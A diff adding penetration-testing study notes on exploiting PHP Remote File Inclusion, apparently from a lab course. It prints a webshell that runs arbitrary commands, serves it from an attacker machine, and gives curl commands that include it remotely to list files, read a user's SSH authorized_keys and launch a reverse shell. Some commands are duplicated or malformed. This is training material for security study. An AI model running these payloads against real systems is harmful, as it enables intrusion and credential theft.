@@ -1,1 +1,92 @@
+Remote File Inclusion (RFI)
+Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. 
+In PHP web applications, for example, the allow_url_include option needs to be enabled to leverage RFI, just as with the data:// wrapper 
+As stated, it is disabled by default in all current versions of PHP. 
+While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB. 
+The included file is also executed in the context of the web application. 
+Common scenarios where we'll find this option enabled is when the web application loads files or contents from remote systems e.g. libraries or application data. 
+
+Kali Linux includes several PHP webshells in the /usr/share/webshells/php/ directory that can be used for RFI. 
+A webshell is a small script that provides a web-based command line interface, making it easier and more convenient to execute commands. 
+We will use a simple-backdoor.php webshell to exploit an RFI vulnerability in the web application.
+
+First, let's briefly review the contents of the simple-backdoor.php webshell. 
+We'll use it to test the LFI vulnerability from the previous sections for RFI. 
+The code is very similar to the PHP snippet we used in previous sections. 
+It accepts commands in the cmd parameter and executes them via the system function.
+
+kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
+...
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
+
+
+To leverage an RFI vulnerability, we need to make the remote file accessible by the target system. 
+We can use the Python3 http.server module to start a web server on our Kali machine and serve the file we want to include remotely on the target system. 
+The http.server module sets the web root to the current directory of our terminal.
+We could also use a publicly-accessible file, such as one from Github.
+kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
+
+After the web server is running with /usr/share/webshells/php/ as its current directory, we have completed all necessary steps on our attacking machine. 
+Next, we'll use curl to include the hosted file via HTTP and specify ls as our command.
+
+curl "http://desserts.com/index.php?page=http://192.168.119.x/simple-backdoor.php&cmd=ls"
+$ curl "http://desserts.com/index.php?page=http://192.168.119.x:80/php-reverse-shell.php&%20php%20php-reverse-shell.php"
+$ curl "http://desserts.com/index.php?page=http://192.168.119.x:80/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
+
+Exploiting RFI with a PHP backdoor and execution of ls
+kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.x.3/simple-backdoor.php&cmd=ls"
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 
+
+<pre>admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+</pre>                        
+    
+
+We successfully exploited an RFI vulnerability by including a remotely hosted webshell. 
+We could now use Netcat again to create a reverse shell and receive an interactive shell on the target system, as in the LFI section.
+
+$ curl "http://desserts.com/meteor/index.php?page=http://192.168.119.x:80/php-reverse-shell.php&%20php%20php-reverse-shell.php"
+$ curl "http://desserts.com/meteor/index.php?page=http://192.168.119.x:80/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
